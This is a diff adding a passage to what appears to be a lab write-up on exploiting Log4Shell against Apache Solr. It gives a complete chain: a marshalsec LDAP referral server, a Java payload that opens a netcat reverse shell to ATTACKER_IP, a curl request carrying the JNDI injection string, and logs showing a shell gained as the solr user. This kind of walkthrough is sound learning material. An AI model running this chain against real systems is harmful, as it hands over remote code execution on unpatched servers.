@@ -102,6 +102,85 @@ sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
 sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
 sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
 ```
+We'll need to clone marshalsec locally and build the utility using maven.
+```
+git clone https://github.com/mbechler/marshalsec
+sudo apt install maven
+cd marshalsec
+mvn clean package -DskipTests
+```
+Output:
+```
+[INFO] ------------------------------------------------------------------------
+[INFO] BUILD SUCCESS
+[INFO] ------------------------------------------------------------------------
+[INFO] Total time:  51.013 s
+[INFO] Finished at: 2021-12-28T18:27:32-05:00
+[INFO] ------------------------------------------------------------------------
+```
+Next, we're going to start the LDAP server, which will wait for incoming connections and redirect those connections to our secondary HTTP server.
+We're going to set the server to listen on port 8000.
+```
+$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit"
+Listening on 0.0.0.0:1389
+```
+Now that the LDAP server is running, we can write a Java payload that will be hosted by our secondary server, which will execute a reverse shell once it receives a connection.
+```java
+//filename: Exploit.java
+public class Exploit {
+        static {
+                try {
+                        java.lang.Runtime.getRuntime().exec("nc -e /bin/bash ATTACKER_IP 9999");
+                } catch (Exception e) {
+                        e.printStackTrace();
+                }
+        }
+}
+```
+This Java payload executes a netcat listening on port 9999. Once a connection is caught, it will call back to our attacker machine.<br/><br/>
+Compile this payload; `javac Exploit.java`.<br/><br/>
+Set up a secondary HTTP server.
+```
+python3 -m http.server
+```
+Run netcat on port 9999 to receive the reverse shell.
+```
+nc -nvlp 9999
+```
+Now that we have all 3 things setup (marshalsec LDAP server, secondary HTTP server, netcat listener), we can run the exploit.
+```
+curl "http://TARGET_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}"
+```
+Output:
+```
+$ curl "http://10.10.137.149:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.219.166:1389/Exploit\}"
+{
+  "responseHeader":{
+    "status":0,
+    "QTime":0},
+  "initFailures":{},
+  "status":{}}
+```
+Marshalsec output:
+```
+$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.219.166:8000/#Exploit"
+Listening on 0.0.0.0:1389
+Send LDAP reference result for Exploit redirecting to http://10.8.219.166:8000/Exploit.class
+```
+HTTP server output:
+```
+$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.137.149 - - [28/Dec/2021 20:15:21] "GET /Exploit.class HTTP/1.1" 200 -
+```
+Netcat listener:
+```
+$ nc -nvlp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.10.137.149 40180
+id
+uid=1001(solr) gid=1001(solr) groups=1001(solr)
+```
 ```
 TO BE CONTINUED
 ```
